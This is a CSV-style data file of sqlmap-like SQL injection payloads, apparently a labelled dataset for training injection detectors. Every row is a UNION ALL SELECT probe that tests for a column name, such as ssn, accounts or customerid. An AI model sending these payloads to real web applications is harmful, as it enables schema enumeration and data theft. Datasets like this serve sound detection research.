"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT staffno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- anmD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PQPX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT metadatainfoid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mSzK",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT context FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- chOm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT app_title FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gsDu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dest FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wuFO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT attributecategory_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sxkf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT operation_type FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SPuB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dnum FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dnOX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pers_id_registerer FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PCyv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT datasource FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XeMT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT connectorid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mJGT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT our_loc FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kuGb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT country_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rBfW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hzka",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT capital FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RwDI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT search_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EOfR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT statechangeid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- utkt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rightid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AuqV",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT endstateid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tmUW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT distconnectorid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nBIZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT walnut FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Cbpz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT distmacaddr FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mREc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pixsize FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kNue",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jobid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rTrY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT revid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FuXh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT match_cid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oDeW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT branchno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- svis",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prepend_digits FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fzCk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stockno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cRYR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ncbofileid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GqMs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT object_type FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IykT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aKuc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pubid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SRJd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qagent FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uYbS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT office FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yrTv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT db_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YYcI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bank FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xcWu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dummy FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- apMm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT storyname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Wyzg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT col FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YRbW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT petty FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iOsq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wLlY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xokX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT inv_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- riIm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT inventory FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kNft",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gift FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- enPh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vWGT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT item FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GXys",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT c_sec_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GiVW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT row_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DTHo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT price FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UuMC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loc_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YhwN",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ssn FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MgGl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT c_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rSOw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KXlG",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT parent FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uIPb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT allowance FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ocmy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT color FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mgoH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT group_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oOyt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT accounts FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bvKQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vendorid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XkRn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gifi_accno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OBKR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT movie_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XDoL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rate FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qjlT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT company FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fwvA",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT subid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- udYR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT commentpath FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nWLz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT protocol_action_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- riPr",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT topic_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ahcT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT s_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iVMV",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT config_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VoJM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `long` FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MXVu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT link FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vZlA",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT copyright FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hfLa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vehicle FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LCPW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customerid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hLJL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customer FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yVsu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT f_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cdlc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chart_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Btql",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT url FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Mfyo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT host FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rjrW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loans FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Sgzp",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT charttype FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PUgY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT imagefile FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VUDX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data_set_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hZKQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guest_ip FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TWtE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT biosample_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kFzS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT affiliation_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YzSo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT os_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- niYk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT street_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bvcq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT book_code FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gOfC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT object_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GtTP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT start_date FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kcwM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT form_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aOJL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT itemno FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- axvn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT provincial FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- URsX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT confid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EbDo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ratingid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Csbg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT drinker FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YOoM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qname_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jqWw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT whatsdom FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XykZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT config_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uJyQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ship_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zcIL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT investigator_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XcdF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT smilies_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Fauu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cal_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XAyo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT license_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bLxB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT conf FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zKgC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contact_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jomu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT procedure_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LmmS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT column_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RhNF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chromosome_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SykH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tf_key FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PsCj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT agent_specialtyid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fHrQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT users_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VlIU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wNVa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT publisher_code FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YzUI",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT setting FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MEgg",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT format_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Roll",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xstn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT slogan FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tBDY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT superssn FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xCqt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- newX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT referredby FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hDJb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT operationid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZLpQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ban_ip FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UAIl",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT p_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yfhi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lbl_aom_unaccessible_shipmethod FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tlph",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT origin FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xddR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT comment_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ozpz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT product_version FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tCZw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT probe_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uYhz",1,,
